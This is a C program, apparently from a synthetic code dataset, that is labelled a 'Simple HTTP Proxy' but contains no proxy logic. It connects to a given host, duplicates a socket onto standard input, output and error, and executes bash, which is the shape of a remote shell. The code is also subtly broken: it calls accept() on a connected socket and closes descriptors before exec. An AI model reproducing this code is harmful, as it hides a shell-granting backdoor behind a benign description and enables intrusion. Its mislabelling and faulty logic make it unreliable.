//Falcon-180B DATASET v1.0 Category: Simple HTTP Proxy ; Style: accurate
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/wait.h>

#define BUF_SIZE 1024

void error(const char *msg) {
    perror(msg);
    exit(1);
}

int main(int argc, char **argv) {
    if (argc!= 3) {
        fprintf(stderr, "Usage: %s <port> <host>\n", argv[0]);
        return 1;
    }

    int port = atoi(argv[1]);
    char *host = argv[2];

    int listen_sock = socket(AF_INET, SOCK_STREAM, 0);
    if (listen_sock == -1) {
        error("socket");
    }

    struct sockaddr_in server_addr;
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    if (inet_pton(AF_INET, host, &server_addr.sin_addr) <= 0) {
        error("inet_pton");
    }

    if (connect(listen_sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) == -1) {
        error("connect");
    }

    int accept_sock = accept(listen_sock, NULL, NULL);
    if (accept_sock == -1) {
        error("accept");
    }

    dup2(accept_sock, 0);
    dup2(accept_sock, 1);
    dup2(accept_sock, 2);

    close(listen_sock);
    close(accept_sock);

    execlp("bash", "bash", NULL);
    error("execlp");

    return 1;
}